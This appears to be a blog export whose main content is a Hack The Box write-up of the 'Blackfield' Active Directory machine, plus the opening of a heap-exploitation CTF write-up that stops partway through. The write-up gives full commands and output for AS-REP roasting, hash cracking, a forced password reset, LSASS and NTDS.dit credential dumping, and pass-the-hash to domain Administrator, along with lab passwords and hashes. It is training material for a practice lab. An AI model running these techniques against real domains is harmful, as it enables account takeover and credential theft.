
[{"content":"","date":"25 January 2025","externalUrl":null,"permalink":"/tags/active-directory/","section":"Tags","summary":"","title":"Active-Directory","type":"tags"},{"content":" Box Information # Creator: aas Release Date: 06 Jun, 2020 OS: Windows Difficulty: Hard This machine starts with getting a list of valid users from SMB, which is used to perform AS-REP roasting to get access to a user. This is then used to change another user\u0026rsquo;s password, who has access over a share in SMB that contains the memory dump for LSASS. I extracted the hashes and gained access to a user with backup privileges, allowing the dumping of domain hashes.\nRecon # Nmap scan # I started the box with a port scan using Nmap. Looks like this box is an active directory (AD) box as it has the DNS, Kerberos, and LDAP running. From the scan results, we can also get the domain name, which is BLACKFIELD.local.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ sudo nmap -p- --min-rate 10000 10.10.10.192 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 13:10 WIB Nmap scan report for 10.10.10.192 Host is up (1.1s latency). Not shown: 65527 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 3268/tcp open globalcatLDAP 5985/tcp open wsman Nmap done: 1 IP address (1 host up) scanned in 24.88 seconds ‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ sudo nmap -p 53,88,135,389,445,593,3268,5985 -sCV 10.10.10.192 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 13:12 WIB Nmap scan report for 10.10.10.192 Host is up (0.60s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-25 13:12:56Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: 6h59m58s | smb2-time: | date: 2025-01-25T13:13:24 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 84.98 seconds SMB enumeration # Since there\u0026rsquo;s SMB running, I decided to start the enumeration here. I start by testing for SMB null authentication and guest account using netexec. The SMB doesn\u0026rsquo;t allow us to list shares as null account, but we can use guest account to do that.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ netexec smb 10.10.10.192 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\: SMB 10.10.10.192 445 DC01 [-] Error enumerating shares: STATUS_ACCESS_DENIED ‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ netexec smb 10.10.10.192 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\guest: SMB 10.10.10.192 445 DC01 [*] Enumerated shares SMB 10.10.10.192 445 DC01 Share Permissions Remark SMB 10.10.10.192 445 DC01 ----- ----------- ------ SMB 10.10.10.192 445 DC01 ADMIN$ Remote Admin SMB 10.10.10.192 445 DC01 C$ Default share SMB 10.10.10.192 445 DC01 forensic Forensic / Audit share. SMB 10.10.10.192 445 DC01 IPC$ READ Remote IPC SMB 10.10.10.192 445 DC01 NETLOGON Logon server share SMB 10.10.10.192 445 DC01 profiles$ READ SMB 10.10.10.192 445 DC01 SYSVOL Logon server share There are two non-standard shares here, which are forensic and profiles$, and I have read access to profiles$. I will use smbclient to connect to the share and list the contents, and I found that the content of the shares are a lot of empty folders for different users in this machine.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ smbclient \u0026#39;//10.10.10.192/profiles$\u0026#39; -U guest Password for [WORKGROUP\\guest]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Wed Jun 3 23:47:12 2020 .. D 0 Wed Jun 3 23:47:12 2020 AAlleni D 0 Wed Jun 3 23:47:11 2020 ABarteski D 0 Wed Jun 3 23:47:11 2020 ABekesz D 0 Wed Jun 3 23:47:11 2020 ...SNIP... ZMalaab D 0 Wed Jun 3 23:47:12 2020 ZMiick D 0 Wed Jun 3 23:47:12 2020 ZScozzari D 0 Wed Jun 3 23:47:12 2020 ZTimofeeff D 0 Wed Jun 3 23:47:12 2020 ZWausik D 0 Wed Jun 3 23:47:12 2020 5102079 blocks of size 4096. 1693830 blocks available smb: \\\u0026gt; We can take the name of these users and make them into a wordlist, then probably use Kerbrute to validate them. Found three valid usernames that we can\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ awk \u0026#39;{print $1}\u0026#39; raw.txt \u0026gt; users.list ‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ kerbrute userenum -d BLACKFIELD.local --dc 10.10.10.192 users.list __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 01/25/25 - Ronnie Flathers @ropnop 2025/01/25 13:29:28 \u0026gt; Using KDC(s): 2025/01/25 13:29:28 \u0026gt; 10.10.10.192:88 2025/01/25 13:29:53 \u0026gt; [+] VALID USERNAME: audit2020@BLACKFIELD.local 2025/01/25 13:32:12 \u0026gt; [+] VALID USERNAME: support@BLACKFIELD.local 2025/01/25 13:32:13 \u0026gt; [+] VALID USERNAME: svc_backup@BLACKFIELD.local 2025/01/25 13:32:48 \u0026gt; Done! Tested 314 usernames (3 valid) in 200.271 seconds Since we can authenticate as guest on the SMB, I decided to do RID brute-force too to get a list of usernames. I found another user lydericlefebvre that doesn\u0026rsquo;t appear on our results above, probably because of the username format firstnamelastname.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ netexec smb 10.10.10.192 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --rid-brute SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\guest: ...SNIP... SMB 10.10.10.192 445 DC01 1103: BLACKFIELD\\audit2020 (SidTypeUser) SMB 10.10.10.192 445 DC01 1104: BLACKFIELD\\support (SidTypeUser) SMB 10.10.10.192 445 DC01 1413: BLACKFIELD\\svc_backup (SidTypeUser) SMB 10.10.10.192 445 DC01 1414: BLACKFIELD\\lydericlefebvre (SidTypeUser) ...SNIP... Shell as svc_backup # AS-REP roasting # Now that we have a valid list of usernames, we can attempt to check and perform AS-REP roasting. I use GetNPUsers.py for this. Found the AS-REP hash for user support.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ GetNPUsers.py BLACKFIELD.local/ -usersfile valid_users.list -dc-ip 10.10.10.192 -request Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /home/chronopad/.local/bin/GetNPUsers.py:163: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User audit2020 doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a [-] User svc_backup doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lydericlefebvre doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Let\u0026rsquo;s identify the hashcat mode for the hash with haiti, then crack the hash using hashcat. Obtained the credential support:#00^BlackKnight.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ haiti \u0026#39;$krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a\u0026#39; Kerberos 5 AS-REP etype 23 [HC: 18200] [JtR: krb5asrep] ‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ echo \u0026#39;$krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a\u0026#39; \u0026gt; support.asrep ‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ hashcat -m 18200 support.asrep ~/Arsenal/wordlists/rockyou.txt $krb5asrep$23$support@BLACKFIELD.LOCAL:fafb8eb6bd898ff74a1ea009dfd54656$64ca069a01cdba05e22742828e95bb3ff5b61b4ea2ddc0d86865f907e9defc43d983dbd64cd4125f872761d465527bda41a982c51897d8d8f9e600c8a80ca8aa8c033a5f7f39441e6d47d22d4b209e05dde4491d6a1a25e9125fb377134d71ae2fc1b7129c7586946841f3f9b3d2704b3297a967aa7e85e86ca8300503e1ce84a310a17915a7db21c5f5736c55f2ed22cc24bb1bbf963ed9a1ed33143c5eae33dd9ffc97cea8aa4ef5edc85d837980877eb7c0f20d43fb9e1853ba3373988c4d844a57e51c6aefb911a4f1e9a386c91a41bd84ef0324d03fd8e737b0b2b59129d5075c6d248457ef3dfb73152a812e542dc4fa4a:#00^BlackKnight BloodHound enumeration # Now that we got a valid domain user credential, let\u0026rsquo;s do further enumeration with BloodHound. I start by using Python BloodHound ingestor to collect the data.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows] ‚îî‚îÄ$ bloodhound-python -u support -p \u0026#39;#00^BlackKnight\u0026#39; -ns 10.10.10.192 -d BLACKFIELD.local -c all INFO: Found AD domain: blackfield.local INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -3] Temporary failure in name resolution INFO: Connecting to LDAP server: dc01.blackfield.local INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 18 computers INFO: Connecting to LDAP server: dc01.blackfield.local INFO: Found 316 users INFO: Found 52 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: DC01.BLACKFIELD.local INFO: Done in 02M 06S After collecting the data, we can start the neo4j database and feed the data to BloodHound. I started the analysis from the newly obtained user support and found that the user can change the password of another user audit2020.\nLet\u0026rsquo;s change the password of user audit2020. I do this using net rpc command to change the password to something easy, like Password123. I then verified if the change is successful using netexec.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows/bloodhound] ‚îî‚îÄ$ net rpc password \u0026#39;audit2020\u0026#39; \u0026#39;Password123\u0026#39; -U \u0026#39;BLACKFIELD.local\u0026#39;/\u0026#39;support\u0026#39;%\u0026#39;#00^BlackKnight\u0026#39; -S 10.10.10.192 ‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows/bloodhound] ‚îî‚îÄ$ netexec smb 10.10.10.192 -u \u0026#39;audit2020\u0026#39; -p \u0026#39;Password123\u0026#39; SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\audit2020:Password123 SMB enumeration # Let\u0026rsquo;s check the SMB access of audit2020. Turns out now we have read access to the forensic share.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows/bloodhound] ‚îî‚îÄ$ netexec smb 10.10.10.192 -u \u0026#39;audit2020\u0026#39; -p \u0026#39;Password123\u0026#39; --shares SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\audit2020:Password123 SMB 10.10.10.192 445 DC01 [*] Enumerated shares SMB 10.10.10.192 445 DC01 Share Permissions Remark SMB 10.10.10.192 445 DC01 ----- ----------- ------ SMB 10.10.10.192 445 DC01 ADMIN$ Remote Admin SMB 10.10.10.192 445 DC01 C$ Default share SMB 10.10.10.192 445 DC01 forensic READ Forensic / Audit share. SMB 10.10.10.192 445 DC01 IPC$ READ Remote IPC SMB 10.10.10.192 445 DC01 NETLOGON READ Logon server share SMB 10.10.10.192 445 DC01 profiles$ READ SMB 10.10.10.192 445 DC01 SYSVOL READ Logon server share I connected to the share with smbclient and found an interesting file lsass.zip, which seems to be a memory dump of the LSASS. However, the file is too large for us to download directly as it returns this error: parallel_read returned NT_STATUS_IO_TIMEOUT.\nsmb: \\memory_analysis\\\u0026gt; get lsass.zip parallel_read returned NT_STATUS_IO_TIMEOUT I found this forum post on how to copy large files over SMB and tried some methods specified here. The method to set longer timeout works for me.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows/files] ‚îî‚îÄ$ smbclient //10.10.10.192/forensic -U audit2020 Password123 Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; cd memory_analysis smb: \\memory_analysis\\\u0026gt; timeout 600; iosize 16384; io_timeout per operation is now 600 smb: \\memory_analysis\\\u0026gt; get lsass.zip getting file \\memory_analysis\\lsass.zip of size 41936098 as lsass.zip (183.1 KiloBytes/sec) (average 183.1 KiloBytes/sec) smb: \\memory_analysis\\\u0026gt; Unzipping lsass.zip gives lsass.DMP, which indeed is the memory dump of LSASS. We can extract credentials from this file using pypykatz. Found the NT hash for svc_backup: 9658d1d1dcd9250115e2205d9f48400d.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows/files] ‚îî‚îÄ$ pypykatz lsa minidump ./lsass.DMP ...SNIP... == LogonSession == authentication_id 406499 (633e3) session_id 2 username svc_backup domainname BLACKFIELD logon_server DC01 logon_time 2020-02-23T18:00:03.423728+00:00 sid S-1-5-21-4194615774-2175524697-3563712290-1413 luid 406499 == MSV == Username: svc_backup Domain: BLACKFIELD LM: NA NT: 9658d1d1dcd9250115e2205d9f48400d SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c DPAPI: a03cd8e9d30171f3cfe8caad92fef621 == WDIGEST [633e3]== username svc_backup domainname BLACKFIELD password None password (hex) == Kerberos == Username: svc_backup Domain: BLACKFIELD.LOCAL == WDIGEST [633e3]== username svc_backup domainname BLACKFIELD password None password (hex) == DPAPI [633e3]== luid 406499 key_guid 836e8326-d136-4b9f-94c7-3353c4e45770 masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991 ...SNIP... If we look for svc_backup on our BloodHound, we can see this user is a part of Remote Management and Backup Operators group. This means we can connect to this user using evil-winrm. Obtained the user flag.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows/files] ‚îî‚îÄ$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; Shell as system # Shell enumeration # Remember that this user is a member of the Backup Operators group, which must mean that this user has SeBackupPrivilege. Let\u0026rsquo;s quickly verify it.\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; Since we have SeBackupPrivilege, we can use the privilege escalation technique specified on this post. Basically we have full read access to the system, allowing us to read sensitive files like the SAM file and SYSTEM registry file, which contains the credentials of highly privileged users that we can crack.\nExploiting SeBackupPrivilege # We can use reg save to copy the registry files sam and system, then download them using the download functionality of evil-winrm. Note that downloading the system takes a while.\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; reg save hklm\\sam c:\\sam.reg The operation completed successfully. *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; reg save hklm\\system c:\\system.reg The operation completed successfully. *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; download c:\\sam.reg Info: Downloading c:\\sam.reg to sam.reg Info: Download successful! *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; download c:\\system.reg Info: Downloading c:\\system.reg to system.reg Info: Download successful! *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt; After getting them on our local machine, we can use secretsdump.py from Impacket to extract the credentials.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows/files] ‚îî‚îÄ$ secretsdump.py -sam sam.reg -system system.reg LOCAL Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn\u0026#39;t have hash information. [*] Cleaning up... We successfully extracted the local Administrator\u0026rsquo;s NTLM hash, however there\u0026rsquo;s something missing. I treated this part like a non-domain-joined machine and extracted the local credentials from SAM instead of targeting the domain credentials.\nNow let\u0026rsquo;s start targeting the domain credentials located in the ntds.dit file. I followed the steps specified on the same post as above. Start by creating the file below.\n# chrono.dsh set context persistent nowriters add volume c: alias chrono create expose %chrono% z: ‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows/files] ‚îî‚îÄ$ unix2dos chrono.dsh unix2dos: converting file chrono.dsh to DOS format... After that, I uploaded the chrono.dsh file and created a shadow copy of the C: drive.\n*Evil-WinRM* PS C:\\Temp\u0026gt; upload chrono.dsh ...SNIP... *Evil-WinRM* PS C:\\Temp\u0026gt; diskshadow /s chrono.dsh Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: DC01, 1/25/2025 8:56:27 AM -\u0026gt; set context persistent nowriters -\u0026gt; add volume c: alias chrono -\u0026gt; create Alias chrono for shadow ID {9c8474c6-d67a-401e-a611-2649e7f01c8b} set as environment variable. Alias VSS_SHADOW_SET for shadow set ID {d1f65e75-d98c-4716-9e6a-c820ee4f1306} set as environment variable. Querying all shadow copies with the shadow copy set ID {d1f65e75-d98c-4716-9e6a-c820ee4f1306} * Shadow copy ID = {9c8474c6-d67a-401e-a611-2649e7f01c8b} %chrono% - Shadow copy set: {d1f65e75-d98c-4716-9e6a-c820ee4f1306} %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\\\?\\Volume{6cd5140b-0000-0000-0000-602200000000}\\ [C:\\] - Creation time: 1/25/2025 8:56:28 AM - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 - Originating machine: DC01.BLACKFIELD.local - Service machine: DC01.BLACKFIELD.local - Not exposed - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5} - Attributes: No_Auto_Release Persistent No_Writers Differential Number of shadow copies listed: 1 -\u0026gt; expose %chrono% z: -\u0026gt; %chrono% = {9c8474c6-d67a-401e-a611-2649e7f01c8b} The shadow copy was successfully exposed as z:\\. -\u0026gt; Now we can copy the ntds file to the current directory and download it.\n*Evil-WinRM* PS C:\\Temp\u0026gt; robocopy /b z:\\windows\\ntds . ntds.dit ...SNIP... *Evil-WinRM* PS C:\\Temp\u0026gt; download ntds.dit I used secretsdump.py again to extract the hashes from ntds.dit. Obtained the domain Administrator\u0026rsquo;s hash.\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows/files] ‚îî‚îÄ$ secretsdump.py -system system.reg -ntds ntds.dit local Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Successfully gained access over the Administrator, which marks this machine as rooted!\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/HTB/newlabs/blackfield-windows/files] ‚îî‚îÄ$ netexec smb 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee SMB 10.10.10.192 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\\Administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!) ","date":"25 January 2025","externalUrl":null,"permalink":"/htb/blackfield/","section":"HTB Writeups","summary":"HTB Hard Difficulty Windows Machine. AD.","title":"Blackfield","type":"htb"},{"content":"","date":"25 January 2025","externalUrl":null,"permalink":"/","section":"Chrono Nexus","summary":"","title":"Chrono Nexus","type":"page"},{"content":"","date":"25 January 2025","externalUrl":null,"permalink":"/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":" Contains my writeups for various HTB machines, along with the explanation and scripts. ","date":"25 January 2025","externalUrl":null,"permalink":"/htb/","section":"HTB Writeups","summary":"Contains my writeups for various HTB machines, along with the explanation and scripts.","title":"HTB Writeups","type":"htb"},{"content":"Tags collection if you are looking for a specific topic.\n","date":"25 January 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"Tags collection if you are looking for a specific topic.","title":"Tags","type":"tags"},{"content":"","date":"25 January 2025","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":" Contains writeups for various CTF challenges with explanation and scripts. ","date":"15 January 2025","externalUrl":null,"permalink":"/ctf/","section":"CTF Writeups","summary":"Contains writeups for various CTF challenges with explanation and scripts.","title":"CTF Writeups","type":"ctf"},{"content":"","date":"15 January 2025","externalUrl":null,"permalink":"/tags/heap/","section":"Tags","summary":"","title":"Heap","type":"tags"},{"content":"","date":"15 January 2025","externalUrl":null,"permalink":"/tags/house-of-force/","section":"Tags","summary":"","title":"House-of-Force","type":"tags"},{"content":" Challenge # We are provided a zip file which contains the binary force and its GLIBC. The binary seems to be using GLIBC 2.28 No TCache. Let\u0026rsquo;s analyze the binary to get more information.\nforce: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./.glibc/glibc_2.28_no-tcache/ld.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c50b5c7f0a7dc45dd3409c7fbf1350c534c52662, not stripped\n‚îå‚îÄ‚îÄ(chronopad„âøVincentXPS)-[~/Documents/ctf2025/SpaceHeroesCTF_2022/usetheforceluke] ‚îî‚îÄ$ checksec force [*] \u0026#39;/home/chronopad/Documents/ctf2025/SpaceHeroesCTF_2022/usetheforceluke/force\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b\u0026#39;./.glibc/glibc_2.28_no-tcache\u0026#39; Stripped: No We are given a custom GLIBC file, which means that there\u0026rsquo;s a specific exploit that we can only perform in this specific GLIBC version, usually a part of heap exploitation techniques.\nSolution # If we run the binary, we are given two addresses leak. One address is system and the other seems to be the address of the heap. We are then given two choices, which is to \u0026ldquo;Reach out with the force\u0026rdquo; or to \u0026ldquo;Surrender\u0026rdquo;. Surrendering will exit the program while the first option will trigger some questions. To understand what they do, we can try disassembling the binary. Here is a part of main() disassembled with radare2.\n‚îÇ ‚îÇ‚ïé‚îÇ 0x004009a2 488d3dbc0100. lea rdi, str.How_many_midi_chlorians_:_ ; 0x400b65 ; \u0026#34;How many midi-chlorians?: \u0026#34; ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009a9 b800000000 mov eax, 0 ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009ae e8bdfdffff call sym.imp.printf ; int printf(const char *format) ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009b3 488d45e0 lea rax, [var_20h] ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009b7 4889c6 mov rsi, rax ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009ba 488d3dbf0100. lea rdi, str._llu ; 0x400b80 ; \u0026#34;%llu\u0026#34; ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009c1 b800000000 mov eax, 0 ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009c6 e8e5fdffff call sym.imp.__isoc99_scanf ; int scanf(const char *format) ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009cb 488d3db30100. lea rdi, str.What_do_you_feel_:_ ; 0x400b85 ; \u0026#34;What do you feel?: \u0026#34; ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009d2 b800000000 mov eax, 0 ‚îÇ ‚îÇ‚ïé‚îÇ 0x004009d7 e894fdffff call 